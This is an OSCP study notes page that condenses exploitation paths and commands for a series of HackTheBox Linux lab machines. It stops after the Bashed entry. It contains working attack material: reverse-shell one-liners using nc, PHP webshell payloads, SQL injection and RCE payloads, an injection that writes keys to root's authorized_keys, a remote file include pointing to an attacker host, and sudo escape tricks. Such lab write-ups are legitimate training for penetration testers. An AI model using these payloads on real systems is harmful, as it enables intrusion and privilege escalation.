+++
title = 'HTB Linux Machines — OSCP Edge Cases'
date = 2026-10-30
type = 'notes'
weight = 50
toc = true
tags = ['oscp', 'methodology', 'htb', 'linux', 'writeups']
+++

> Consolidated index of 39 OSCP-like HTB Linux boxes — one path per box, the non-obvious steps that decide it, and the exact commands worth memorising. These are **edge-case notes, not walkthroughs**: every command must be adapted to the target (IPs, vhosts, ports, usernames, payload paths), and the source writeup remains the walkthrough of record.
>
> **Verification status:** every CVE and technique below was checked against public advisories, NVD, and at least two independent write-ups. **Two CVE misattributions were found and corrected** — Enigma's OpenSTAManager chain and Keeper's KeePass CVE. Both are fixed in the rows below and documented in [Corrections](#corrections). Where a source conflict remains, it is flagged inline as **(unverified)**.

Companion pages: [Command Checklist](/notes/oscp-labs/commands/) · [Pattern Library](/notes/oscp-labs/patterns/) · [Methodology](/notes/oscp-labs/methodology/) · [Machine Index](/notes/oscp-labs/machine-index/).

## How to use this page

* Start with a full TCP scan plus the UDP ports people skip (161, and NFS/mountd on dynamic ports), then fuzz vhosts before directory-brute-forcing the IP root.
* Treat every credential as a username+password pair and spray it at SSH, `su` and the application itself before hunting another bug.
* After landing a shell, run the triad — `sudo -l`, SUID/capabilities, and `pspy`/cron/timers — plus `ss -tnl` for localhost-only services.
* When an exploit fails, read the application's own source and config (`.git`, backups, `*.inc.php`, JAR/ZIP contents) before assuming the target is patched.

***

## Enigma

**Path:** NFS export `/srv/nfs/onboarding` holds an onboarding PDF with webmail creds → Roundcube `mail001` → password reuse to a second mailbox → OpenSTAManager 2.9.8 support portal → `www-data` → DB hash → `haris` → OliveTin on 1337 → root.

**Edge cases:**

* Full-port scan matters: NFS plus mountd on **dynamic** ports. `showmount -e` on 111/2049, then mount the export — a share is a credential source, not just a file read.
* Roundcube at `mail001.enigma.htb`; mailboxes yield **username patterns** and a second portal (`support_001`), and the same password works across employees — spray before exploiting.
* OpenSTAManager 2.9.8 is the foothold. **Correction:** the RCE chain is **CVE-2026-29782** (authenticated SQLi → PHP object injection via PHPGGC → RCE), not CVE-2025-69212. CVE-2025-69212 is a separate **OS Command Injection** in the P7M (signed XML) decoding function, and CVE-2026-24418 is an error-based SQLi in the Scadenzario module. The "unverified" note in earlier drafts is resolved.
* `config.inc.php` gives MySQL creds; `zz_users` holds a bcrypt hash for `haris` (crack → SSH). OliveTin listens only on `127.0.0.1:1337`; `/etc/OliveTin/config.yaml` builds `mysqldump -u {{db_user}} -p'{{db_pass}}' ...` — break out of the single quotes.

**Commands to remember:**

```bash
showmount -e enigma.htb
sudo mount -t nfs enigma.htb:/srv/nfs/onboarding /mnt/enigma
ssh -L 1337:127.0.0.1:1337 haris@enigma.htb
# db_pass argument, breaking out of -p'...':
# test'; mkdir -p /root/.ssh; echo "ssh-ed25519 ..." >> /root/.ssh/authorized_keys; echo '
```

**Notes:** [NFS](/notes/protocols-and-services/nfs/) · [IMAP](/notes/protocols-and-services/imap/) · Writeup: [source](https://dev.to/muhammad_saad_ce88b4330bf/htb-enigma-writeup-2p1d) · [alt](https://www.partywave.site/show/writeup/htb-enigma-writeup)

## Nibbles

**Path:** HTML comment `<!-- /nibbleblog/ ... -->` → NibbleBlog 4.0.3 `admin:nibbles` → CVE-2015-6967 authenticated plugin upload → `nibbler` → sudo NOPASSWD on world-writable `monitor.sh`.

**Edge cases:**

* The path is leaked by an **HTML comment**, not a wordlist. `/nibbleblog/content/private/users.xml` has directory listing on and discloses the username **and** failed-login IPs — enumerate app content dirs before brute force.
* Password is literally the box name; `README` discloses the version → CVE-2015-6967 (unrestricted file upload in the My Image plugin, NibbleBlog < 4.0.5).
* The uploaded shell has a fixed name (`.../plugins/my_image/image.php`), so on shared/free labs other players overwrite it — go straight to a callback payload.
* `monitor.sh` is `-rwxrwxrwx`; **append** your payload instead of overwriting (others may already have broken the script).

**Commands to remember:**

```bash
gobuster dir -u http://IP/nibbleblog/ -x php,txt
msf> use multi/http/nibbleblog_file_upload   # set USERNAME/PASSWORD/TARGETURI
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 8083 >/tmp/f' >> monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

**Notes:** [File uploads](/notes/web-applications/web-attacks/file-uploads/) · [Programs, jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · Writeup: [source](https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html)

## Solidstate

**Path:** Apache James 2.3.2 admin on **4555** (`root:root`) → reset user passwords → POP3 mail on 110 leaks SSH creds → `rbash` shell → world-writable `/opt/tmp.py` run by root cron.

**Edge cases:**

* Port 4555 is labelled `rsip`/`james-admin` by nmap and is the whole foothold; default **root:root** confirmed across multiple write-ups. `listusers` / `setpassword <user> <pass>`, then read mail over POP3 with telnet (`USER`/`PASS`/`LIST`/`RETR 1`); `mailadmin` is a decoy with no mail.
* `rbash` is escaped trivially with `ssh -t bash` — no need for the intended James path-traversal exploit.
* Box is **32-bit**: use `pspy32`. PSpy shows root cron running `/bin/sh -c python /opt/tmp.py` every 3 minutes.
* Intended path: `adduser ../../../../etc/bash_completion.d` plus an SMTP `RCPT TO:` path traversal writes a root-owned completion script executed on next login; the manual payload needs a leading `'` in `MAIL FROM` or the script breaks early.

**Commands to remember:**

```bash
nc IP 4555   # help / listusers / setpassword mindy pass
telnet IP 110   # USER / PASS / RETR 1
sshpass -p 'P@55W0rd1!2@' ssh mindy@IP -t bash
wget IP/pspy32; chmod +x pspy32; ./pspy32
```

**Notes:** [POP3](/notes/protocols-and-services/pop3/) · [SMTP](/notes/protocols-and-services/smtp/) · [Programs, jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · Writeup: [source](https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html)

## Poison

**Path:** LFI `browse.php?file=` → Apache access-log poisoning → webshell → SSH as `charix` (password from a 13× base64 file) → root VNC on localhost unlocked with `secret.zip`.

**Edge cases:**

* `listfiles.php` reveals `pwdbackup.txt`; the password is base64 encoded **13 times** — a simple loop decodes it.
* `phpinfo.php` through the LFI shows `allow_url_include=Off`, so stop chasing RFI and go log-poisoning. Log path comes from `/usr/local/etc/apache24/httpd.conf` (`/var/log/httpd-access.log` on FreeBSD); poison the User-Agent with a marker string.
* `secret.zip` opens with the **same** user password; the file inside (`secret`) is the VNC passwd file for root's `Xvnc :1` (`-localhost`, 5901/5801). Read it with `python vncpasswd.py -d -f secret`.
* FreeBSD privesc enumeration needs FreeBSD flags: `netstat -an -p tcp` (not `-tlnp`).

**Commands to remember:**

```bash
for i in $(seq 1 13); do data=$(echo $data | tr -d ' ' | base64 -d); done
# User-Agent: <?php system($_GET['c']); ?>
curl 'http://IP/browse.php?file=/var/log/httpd-access.log&c=id'
ssh -D 8081 charix@IP
proxychains vncviewer 127.0.0.1:5901 -passwd secret
```

**Notes:** [LFI](/notes/web-applications/web-attacks/local-file-inclusion-lfi/) · [Pivoting and tunneling](/notes/utilities-scripts-and-payloads/pivoting-tunneling-port-forwarding/) · Writeup: [source](https://0xdf.gitlab.io/2018/09/08/htb-poison.html)

## Editor

**Path:** Vhost `wiki.editor.htb` = XWiki 15.10.8 → **CVE-2025-24893** Groovy RCE via `SolrSearch` → `xwiki` → `hibernate.cfg.xml` creds → SSH `oliver` → Netdata `ndsudo` **CVE-2024-32019** PATH hijack → root.

**Edge cases:**

* Two apps, one IP: `ffuf Host: FUZZ.editor.htb -ac` finds `wiki`; the wiki is also directly on 8080 (Jetty).
* The unauth payload is a `SolrSearch` RSS request whose `text=` is `}}}{{async async=false}}{{groovy}}println(...){{/groovy}}{{/async}}`. When re-encoding in Burp use **"URL-encode all characters"** — key-characters encoding turns spaces into `+` and 500s.
* Groovy ignores shell pipes: `curl ... | bash` becomes a literal filename. Download then execute (`curl -o /dev/shm/rev` → `bash /dev/shm/rev`). Config creds (`hibernate.cfg.xml`) are reused for SSH as `oliver`; `su` fails even with the right password because the xwiki systemd unit sets `NoNewPrivileges=true`.
* Root: `ss -tnl` shows 19999 (Netdata 1.45.2) localhost-only; SUID `ndsudo` resolves `nvme`/`megacli` from **PATH** → plant a fake binary. `--test` prints the resolved command, the fastest confirmation.

**Commands to remember:**

```bash
ffuf -u http://IP -H "Host: FUZZ.editor.htb" -w subdomains-top1million-20000.txt -ac
curl -G 'http://wiki.editor.htb/xwiki/bin/view/Main/SolrSearch' --data-urlencode 'media=rss' --data-urlencode 'text=}}}{{async async=false}}{{groovy}}println("id".execute().text){{/groovy}}{{/async}}'
ssh -L 19999:localhost:19999 oliver@editor.htb
PATH=/tmp:$PATH ndsudo nvme-list
```

**Notes:** [Environment variables abuse](/notes/linux-privilege-escalation/environment-variables-abuse/) · [Fuzzing](/notes/web-applications/fuzzing/) · Writeup: [source](https://0xdf.gitlab.io/2025/12/06/htb-editor.html)

## Sunday

**Path:** `finger` on 79 enumerates users → SSH on **22022** as `sunny:sunday` → world-readable `/backup/shadow.backup` cracked → `sammy` → `sudo wget` → root.

**Edge cases:**

* Non-standard SSH port **22022**; `finger @IP` may return "No one logged on" on a quiet VIP box, so brute-force names instead of trusting the nmap script.
* `finger-user-enum.pl` distinguishes real users: nonexistent returns `???`, real returns TTY/login data.
* Password = box name for `sunny`; `/backup/shadow.backup` is world-readable and gives `$5$` SHA-256 crypt hashes → hashcat mode **7400**.
* `sudo wget` is a multi-way privesc: read a file via `--input-file` error message, exfil via `--post-file` to `nc`, or overwrite root-owned files with `-O` (e.g. `/root/troll`, then run it). `python -m http.server` cannot receive POST — use `nc -lnvp`.

**Commands to remember:**

```bash
./finger-user-enum.pl -U names.txt -t IP
hashcat -m 7400 hashes rockyou.txt
sudo wget --input-file /root/root.txt
sudo wget http://IP/shell.py -O /root/troll
```

**Notes:** [Password attacks](/notes/utilities-scripts-and-payloads/password-attacks/) · [Programs, jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · Writeup: [source](https://0xdf.gitlab.io/2018/09/29/htb-sunday.html)

## Keeper

**Path:** Vhost `tickets.keeper.htb` runs Request Tracker 4.4.4 with default **root:password** → edit a user to read their password → SSH `lnorgaard` → KeePass memory dump + `.kdbx` → PuTTY key → root.

**Edge cases:**

* Vhost not found by dir brute force: `ffuf -H "Host: FUZZ.keeper.htb" -ac`.
* The credential is **not** in the ticket body — as RT admin you open the user profile and edit it; the "crashdump" ticket is the hint for the next step.
* **Correction:** the KeePass CVE is **CVE-2023-32784**, not CVE-2022-32784. The vulnerability is in KeePass 2.x before 2.54, where the cleartext master password is recoverable from a memory dump. `keepass_dump.py` recovers all but the first character; the mask is the `●` char, so `strings -e S` plus a grep for `\xCF\x25` is enough to read it by eye.
* `kpcli` (`show -f <n>`) reads the kdbx; the root entry is a **PuTTY-User-Key-File-3** pasted in Notes — de-indent it, then `puttygen -O private-openssh`.

**Commands to remember:**

```bash
ffuf -u http://IP -H "Host: FUZZ.keeper.htb" -w subdomains-top1million-20000.txt -ac
strings -e S KeePassDumpFull.dmp | grep -a $(printf "%b" "\xCF\x25\xCF\x25")
kpcli --kdb passcodes.kdbx   # show -f 0
puttygen root-putty.key -O private-openssh -o keeper-root
```

**Notes:** [Password attacks](/notes/utilities-scripts-and-payloads/password-attacks/) · [Miscellaneous techniques](/notes/linux-privilege-escalation/miscellaneous-techniques/) · Writeup: [source](https://0xdf.gitlab.io/2024/02/10/htb-keeper.html)

## Pilgrimage

**Path:** Exposed `.git` → `git-dumper` source review → ImageMagick **CVE-2022-44268** arbitrary file read → SQLite creds → `emily` → inotify-triggered `malwarescan.sh` + binwalk **CVE-2022-4510** → root.

**Edge cases:**

* `.git` is missed by default wordlists; nmap's `http-git` script or a `.git` entry in the list finds it, then `git-dumper` reconstructs source (including the bundled `magick` binary → version 7.1.0-49).
* CVE-2022-44268 payload is a **PNG tEXt chunk with keyword `profile`** whose value is a filename; the app's resize step renders the file's bytes into the output image as hex. Binary targets (SQLite DB) break ASCII-only POC scripts — parse the "Raw profile type" hex yourself with `identify -verbose`, filter, and `xxd -r -p`.
* Root: `malwarescan.sh` (root, via `inotifywait` on `shrunk/`) calls `binwalk -e`; 2.3.2 is CVE-2022-4510 (path traversal in PFS extraction → arbitrary write → `authorized_keys`). Check the bundled version with `binwalk -h` before trusting the web app's.
* Pitfall: filename command injection into that script does **not** work — bash quoting blocks `;` and `$()`.

**Commands to remember:**

```bash
git-dumper http://pilgrimage.htb git
pngcrush -text a "profile" "/etc/passwd" poc.png   # upload, then:
identify -verbose x.png | grep -Pv "^( |Image)" | xxd -r -p > db.sqlite
python walkingpath.py ssh root.png id_ed25519.pub   # then scp into shrunk/
```

**Notes:** [Programs, jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · [Fuzzing](/notes/web-applications/fuzzing/) · Writeup: [source](https://0xdf.gitlab.io/2023/11/25/htb-pilgrimage.html)

## Cozyhosting

**Path:** Spring Boot app: `/actuator/sessions` leaks a live `JSESSIONID` → hijack admin → `/executessh` command injection → `app` → jar unzip → DB creds → `josh` → `sudo ssh` ProxyCommand → root.

**Edge cases:**

* Generic dir brute force finds only `/admin` (401); re-run with **SecLists `spring-boot.txt`** to get `/actuator/*`.
* `/actuator/sessions` maps session IDs to usernames — replace your cookie value, no cracking needed.
* `;`, `&`, `|` are filtered in the **host** field but the **username** field is injectable; use `${IFS}` for spaces and terminate with `#`. Java app mangles pipes/redirects — `curl http://IP/rev.sh -o /tmp/rev.sh` then `bash /tmp/rev.sh` is reliable where `curl ... | bash` is not.
* The JAR is a ZIP: `unzip cloudhosting-0.0.1.jar` and read `BOOT-INF/classes/application.properties` (or exfil and use jd-gui). `sudo ssh` GTFOBins: `-o ProxyCommand` executes **before** the connection, as root.

**Commands to remember:**

```bash
feroxbuster -u http://cozyhosting.htb -w /opt/SecLists/Discovery/Web-Content/spring-boot.txt
curl -s http://IP/actuator/sessions | jq
username=0xdf;ping${IFS}-c${IFS}1${IFS}IP;#
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

**Notes:** [OS command injection](/notes/web-applications/web-attacks/os-command-injection/) · [Programs, jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · Writeup: [source](https://0xdf.gitlab.io/2024/03/02/htb-cozyhosting.html)

## Codify

**Path:** Node app with **vm2 3.9.16** sandbox → escape to `svc` → `tickets.db` bcrypt hash → `joshua` → `sudo mysql-backup.sh` glob bypass + PSpy → root.

**Edge cases:**

* Four vm2 CVEs work on 3.9.16 (CVE-2023-30547/32314/37466/37903); POCs include their own harness — copy **only the `code` variable** into the web form.
* `$2a$12$` hash: hashcat autodetect offers four bcrypt modes; the app uses plain bcrypt → force **`-m 3200`**.
* Privesc bug: `if [[ $DB_PASS == $USER_PASS ]]` is unquoted → entering `*` matches anything and passes the check. The script then runs `mysql`/`mysqldump` with the **real** password on the command line, so `pspy` captures `-p<password>` even without the glob trick.
* Intended alternative: brute-force the password character-by-character with glob classes `[a-z]` in that same unquoted comparison **(unverified)**.

**Commands to remember:**

```bash
hashcat -m 3200 joshua.hash rockyou.txt
sudo /opt/scripts/mysql-backup.sh   # at the prompt, enter: *
./pspy64   # while re-running the script
su - joshua
```

**Notes:** [Programs, jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · [OS command injection](/notes/web-applications/web-attacks/os-command-injection/) · Writeup: [source](https://0xdf.gitlab.io/2024/04/06/htb-codify.html)

## Tartarsauce

**Path:** `robots.txt` → `/webservices/wp` WordPress `gwolle-gb` RFI → `www-data`; `sudo tar` → `onuma`; `backuperer` tar race → root file read / SUID root.

**Edge cases:**

* The five `robots.txt` entries are mostly trolls: `/webservices/monstra-3.0.4` accepts `admin:admin` and has searchsploit RCEs, but its `public/uploads` is root-owned so **every** upload/RCE fails — the live app is `/webservices/wp`.
* `wpscan` reports gwolle-gb `2.3.10`, but its own `readme.txt` changelog says "Changed version from 1.5.3 to 2.3.10 to trick wpscan" — the real 1.5.3 is the RFI.
* RFI requires the remote file to be named **`wp-load.php`** (the include path is fixed), served over HTTP; `/webservices` itself is 403 and must be brute-forced one level deeper.
* `backuperer` runs every 5 min: it writes `/var/tmp/.<sha1>` as **onuma**, sleeps 30s, then root runs `tar -zxvf` into `/var/tmp/check` and `diff -r` against `/var/www/html`. Swap the archive during the sleep with a symlink to `/root/root.txt` → the diff output lands in `/var/backups/onuma_backup_error.txt`. For a root shell, archive a **SUID binary** under `var/www/html/` (`tar zcvf suid.tar.gz var --owner=root --group=root`) so root extracts it with ownership preserved — but the archive must contain the `var/www/html` tree or `diff` exits 2, the `if` evaluates false, and `/var/tmp/check` is deleted.

**Commands to remember:**

```bash
wpscan --url http://IP/webservices/wp --enumerate p,t,u
curl 'http://IP/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://ATTACKER/'
sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
systemctl list-timers   # backuperer.timer
```

**Notes:** [WordPress](/notes/web-applications/web-technologies/wordpress/) · [Programs, jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · Writeup: [source](https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html) · [backuperer follow-up](https://0xdf.gitlab.io/2018/10/21/htb-tartarsauce-part-2-backuperer-follow-up.html)

## Jarvis

**Path:** `room.php?cod=` UNION SQLi → `mysql.user` hash → phpMyAdmin → CVE-2018-12613 LFI→RCE → `www-data`; `simpler.py` `$()` → `pepper`; SUID `systemctl` → root.

**Edge cases:**

* The WAF is **rate-based, not signature-based**: `sqli_defender.py` watches Apache logs and iptables-bans you; port **64999** is the ban/redirect page (90s). Slowing sqlmap is enough — manual `cod=1-- -` still works while tooling gets banned.
* Seven columns, columns 2–5 render on the page; use `cod=999` so the UNION row prints instead of a real room. Dump `group_concat(User,':',Password,':',File_priv)` — `File_priv=Y` is what unlocks `INTO OUTFILE` webshell.
* phpMyAdmin 4.8.0 (CVE-2018-12613) is the alternate foothold: `SELECT '<?php system($_GET["cmd"]);?>'` then include your **session file** with `/phpmyadmin/index.php?target=db_sql.php%3f/../../../../var/lib/php/sessions/sess_$PHPSESSID&cmd=id` — the `%3f` (encoded `?`) truncates the include path.
* `simpler.py` blacklist covers `&`, `;`, `-`, backtick, `||` and `|` — but **`$()` is missing**, so `$(bash)` gives an instant shell as pepper. SUID `/bin/systemctl` is root-owned but group `pepper`: the unit file must live in **`/dev/shm`** — `systemctl link` from `/tmp` fails due to systemd path resolution.

**Commands to remember:**

```bash
sqlmap -u 'http://jarvis.htb/room.php?cod=1' -p cod --random-agent --delay=2 --dbs
cod=999 UNION ALL SELECT null,'<?php system($_REQUEST["cmd"]); ?>',null,null,null,null,null INTO OUTFILE '/var/www/html/shell.php';-- -
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p   # then: $(bash)
/bin/systemctl link /dev/shm/pwn.service; /bin/systemctl enable --now pwn
```

**Notes:** [SQL injection](/notes/web-applications/web-attacks/sql-injection/) · [Programs, jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · Writeup: [source](https://foobarto.me/htb/machines/jarvis/)

## Tabby

**Path:** LFI `news.php?file=` → `tomcat-users.xml` → `manager-script` role deploys a WAR → `tomcat`; password-protected backup in `/var/www/html` → `zip2john` → `ash`; `lxd` group → root.

**Edge cases:**

* You do **not** need `manager-gui`: the leaked account only had `admin-gui` + `manager-script`, so the browser upload is unusable but the **text interface** accepts `PUT /manager/text/deploy?path=/x&update=true`.
* `tomcat-users.xml` path is distro-specific — on Debian/Ubuntu it is `/usr/share/tomcat9/etc/tomcat-users.xml`, found by fuzzing a **tomcat-specific** file list (the generic LFI list misses it). Get the Tomcat version from `/docs`.
* LFI fuzzing: `wfuzz --hw 0` (hide zero-word responses) rather than `--hc 404`, because the app returns 200 with empty bodies. Post-foothold, the `/var/www/html` backup archive → `zip2john` → crack → password is reused for SSH user `ash` (password reuse, not a hash).
* `ash` is in the `lxd` group: import an Alpine image with `security.privileged=true` and mount host `/` into `/mnt/root`, then read `/root` or drop an SSH key (exact `lxc` flags = HackTricks method 2, **unverified verbatim**).

**Commands to remember:**

```bash
wfuzz -c -w lfi.txt --hw 0 'http://megahosting.htb/news.php?file=../../../../../../../FUZZ'
curl -u tomcat:'$3cureP4s5w0rd123!' -T shell.war 'http://megahosting.htb:8080/manager/text/deploy?path=/reverse&update=true'
zip2john backup.zip > h; john h
lxc image import alpine.tar.gz --alias alpine; lxc init alpine p -c security.privileged=true; lxc config device add p host-root disk source=/ path=/mnt/root recursive=true
```

**Notes:** [Tomcat](/notes/web-applications/web-technologies/tomcat/) · [Privileged groups](/notes/linux-privilege-escalation/privileged-groups/) · Writeup: [source](https://oscp-notes-2025.gitbook.io/oscp-writeups/tabby-htb)

## Connected

**Path:** FreePBX 16.0.40.7 pre-auth SQLi (CVE-2025-57819) → stacked `INSERT` into `cron_jobs` → `asterisk` cron writes a PHP shell; writable `/etc/dahdi/init.conf` + incron → root.

**Edge cases:**

* The SQLi is not used for data theft but as a **write primitive into a job table**: one stacked `INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)` with `schedule='* * * * *'`, `max_runtime=30`, `enabled=1` gets arbitrary command execution as `asterisk` within ~60s.
* Injection is in the `brand` parameter of `/admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model` — the long, fixed query string is what makes it hard to spot by fuzzing.
* Encode the payload with `curl -G --data-urlencode` — quotes, pipe characters and base64 break otherwise; the shell body is base64-decoded on target to dodge SQL quoting.
* Privesc is **incron**, not cron/sudo: a root script (`/usr/sbin/sysadmin_dahdi_restart`) is triggered by writes to `/var/spool/asterisk/sysadmin/dahdi_restart` and **sources** `/etc/dahdi/init.conf`, which is owned/writable by `asterisk` — append a reverse shell, then touch the trigger file.

**Commands to remember:**

```bash
nmap -sC -sV IP   # CentOS + PHP/7.4.16 = FreePBX fingerprint
curl -ik -G --data-urlencode "brand=x'; INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES (...)-- -" 'http://connected.htb/admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model'
ls -la /etc/dahdi/init.conf; echo '<payload> &' >> /etc/dahdi/init.conf; echo restart > /var/spool/asterisk/sysadmin/dahdi_restart
ls -la /etc/incron.d/; incrontab -l
```

**Notes:** [SQL injection](/notes/web-applications/web-attacks/sql-injection/) · [Programs, jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · Writeup: [source](https://zahidoverflow.github.io/posts/posts/htb-writeup-connected/)

## Mentor

**Path:** Vhost `api.mentorquotes.htb` → Swagger `/docs` → signup/JWT; SNMP community `internal` → process args leak `james` password → admin JWT → `/admin/backup` `path` command injection (root in Alpine container) → Postgres → hash crack → SSH `svc` → `snmpd.conf` cleartext → `sudo /bin/sh`.

**Edge cases:**

* **161/udp** is missed by default TCP scans; `public` is useless but community **`internal`** works — brute-force the community string, don't assume `public`. `hrSWRunParameters` prints full command lines; one is `/usr/local/bin/login.py <password>`, a classic credential-in-argv leak.
* Vhost fuzzing: `api` returns 404 with a *smaller body* than the default vhost, so match on size, not only status; `/docs` (Swagger) hands you the whole API (`curl -s api.mentorquotes.htb/openapi.json`) plus a real username in the example body.
* `/admin/backup` shells out a JSON `path` value embedded in a `tar` command, so the injected command must be terminated (`{"path":"/tmp;nc IP PORT -e sh;"}` per one source; `{"path":"$(nc IP 4445 -e /bin/sh)"}` per another — both reported, test both).
* The result is **root inside an Alpine Docker container**, not the host; the DB is a neighbouring container. Don't stage chisel (glibc binary on musl fails) — the app image already has `psycopg2`/SQLAlchemy; connect with default `postgres:postgres` and use `COPY ... FROM PROGRAM` for RCE/file read (base64-wrap output, COPY splits on tabs). Two credential reuses close it: cracked MD5 hash → SSH as **`svc`** (email prefix, not `service_acc`), then `snmpd.conf` `createUser ... MD5 <cleartext>` → `su james` → `sudo /bin/sh`.

**Commands to remember:**

```bash
sudo nmap -sU -F IP; snmpbrute -t IP -f common-snmp-community-strings.txt; snmpwalk -v2c -c internal IP
ffuf -u http://mentorquotes.htb -H 'Host: FUZZ.mentorquotes.htb' -w subdomains-top1million-5000.txt -mc 200,404
john --format=Raw-MD5 svc.hash
grep -iE 'password|secure' /etc/snmp/snmpd.conf; sudo -S /bin/sh
```

**Notes:** [SNMP](/notes/protocols-and-services/snmp/) · [Programs, jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · Writeup: [source](https://foobarto.me/htb/machines/mentor/)

## Devvortex

**Path:** Vhost `dev.` → Joomla 4.2.6 CVE-2023-23752 config leak → admin panel → template `error.php` webshell → MySQL → bcrypt crack → `logan`; `sudo apport-cli` pager → root.

**Edge cases:**

* Version is not in the banner: read `/administrator/manifests/files/joomla.xml`; Joomla's stock `robots.txt` and its distinctive 404 page are the fingerprint. CVE-2023-23752 is **mass assignment**: adding `?public=true` to the webservice endpoint bypasses the auth check, leaking `/api/index.php/v1/config/application` (DB creds) and `/api/index.php/v1/users` (admin `lewis`, roles).
* The leaked DB password is **reused** for the Joomla admin login (not SSH). In the template editor `index.php` is **not** writable but `error.php` is — put the shell at the top of `error.php` and trigger it with any 404 path.
* Table prefix is random (`sd4fg_users`), hashes are bcrypt → `hashcat -m 3200` (autodetect refuses with four candidate modes). Query: `select username,password from sd4fg_users;`.
* `apport-cli` 2.20.11 (CVE-2023-1326): it needs a *valid* crash report — a two-line fake works (`ProblemType: Crash` + `Architecture: amd64`), or crash something with `kill -ABRT`. Then choose **V**(iew) → `less` → `!/bin/bash` = root.

**Commands to remember:**

```bash
ffuf -u http://IP -H 'Host: FUZZ.devvortex.htb' -w subdomains.txt -mc all -ac
curl -s 'http://dev.devvortex.htb/api/index.php/v1/config/application?public=true'
hashcat joomla.hashes rockyou.txt --user -m 3200
sudo apport-cli -c ./example.crash   # V, then: !/bin/bash
```

**Notes:** [Joomla](/notes/web-applications/web-technologies/joomla/) · [Miscellaneous techniques](/notes/linux-privilege-escalation/miscellaneous-techniques/) · Writeup: [source](https://0xdf.gitlab.io/2024/04/27/htb-devvortex.html)

## Irked

**Path:** UnrealIRCd 3.2.8.1 backdoor (6697/8067) → `ircd`; steg password in `djmardov`'s home → `steghide` → SSH; SUID `/usr/bin/viewuser` runs `/tmp/listusers` → root.

**Edge cases:**

* **Service banner = user enum**: `nc` to 6697/8067 returns `-Email djmardov@irked.htb for more information`, giving you a username before any exploit. Plain `nc`/telnet is then throttled (`Closing Link ... Reconnecting too fast`) — you need the real backdoor payload (msf module), not an interactive session.
* Privesc #1 is **steganography**, easy to miss: `steghide info irked.jpg` on the image from the site; the passphrase is left in plaintext inside `djmardov`'s home (`find . -type f -exec cat {} \;` surfaced "Super elite steg backup pw" and the passphrase itself).
* `ircd` can read `/home/djmardov` (permissions), but `unrealircd.conf` passwords are decoys — they fail SSH. Test them anyway, then move on fast.
* SUID `/usr/bin/viewuser` calls `/tmp/listusers`, which does not exist as `djmardov` — create it as a shell script and every line runs as **root** (a full reverse shell isn't needed; `whoami`/`cat /root/root.txt` inside the file proves it). `pkexec 0.105` (PwnKit) and `/usr/bin/at` are also SUID here **(PwnKit unverified on this box)** — `viewuser` is the intended path.

**Commands to remember:**

```bash
nc -nv IP 6697   # banner: djmardov@irked.htb
# msfconsole → use exploit/unix/irc/unreal_ircd_3281_backdoor
steghide info irked.jpg; steghide extract -sf irked.jpg --passphrase '<pass>'
find . -type f -exec cat {} \; 2>/dev/null
printf 'cat /root/root.txt\n' > /tmp/listusers; /usr/bin/viewuser
```

**Notes:** [Miscellaneous techniques](/notes/linux-privilege-escalation/miscellaneous-techniques/) · [Enumerating attack vectors](/notes/linux-privilege-escalation/enumerating-attack-vectors/) · Writeup: [source](https://oscp-notes-2025.gitbook.io/oscp-writeups/irked-htb)

## Popcorn

**Path:** Torrent Hoster signup → image upload filter bypass → PHP shell in `/torrent/upload/<sha1>.php` → `www-data`; PAM MOTD CVE-2010-0832 (`~/.cache` symlink) → write `/etc/passwd` → root (DirtyCow alternative).

**Edge cases:**

* The upload filter checks **only `Content-Type`**: keep `image/png`, rename the file to `.php`; content/magic bytes are irrelevant. Extension change alone is allowed — that is the tell that only the header is validated.
* Uploaded names are SHA1-hashed, so you need the **open directory listing** `/torrent/upload/` to learn the name before you can request it. `/test` is a full **phpinfo** page (`file_uploads` on) and `/rename` is an API that leaks its own path — both are recon, and `/rename` is the fallback if an upload lands with a non-executable extension.
* PAM MOTD needs a real **login**, not your reverse shell: `~/.cache` is created at login. So write `~/.ssh/authorized_keys` as `www-data`, SSH in, then `rm -rf ~/.cache; ln -s /etc/passwd ~/.cache` and log in again → `/etc/passwd` becomes yours. Do it in your own home; in the victim's home a `motd.legal-displayed` you don't own blocks the `rm`.
* Fingerprint the era first: kernel 2.6.31 / OpenSSH 5.1 / Apache 2.2.12 = Ubuntu 9.10 → old-PAM and DirtyCow (`gcc -pthread dirty.c -o dirty -lcrypt`) paths both open. `~/.cache/motd.legal-displayed` existing in a home dir is the exploit precondition.

**Commands to remember:**

```bash
gobuster dir -u http://IP -w common.txt -t 40   # /test, /torrent, /rename
# Burp: change filename= to x.php, keep Content-Type: image/png
curl 'http://IP/torrent/upload/<sha1>.php?cmd=id'
rm -rf ~/.cache; ln -s /etc/passwd ~/.cache; ssh localhost true
openssl passwd -1 pw
```

**Notes:** [File uploads](/notes/web-applications/web-attacks/file-uploads/) · [Miscellaneous techniques](/notes/linux-privilege-escalation/miscellaneous-techniques/) · Writeup: [source](https://0xdf.gitlab.io/2020/06/23/htb-popcorn.html)

## Bashed

**Path:** `/dev/phpbash.php` (open dir listing) webshell → `www-data`; `sudo -u scriptmanager`; writable `/scripts` + root cron running every `*.py` → root.

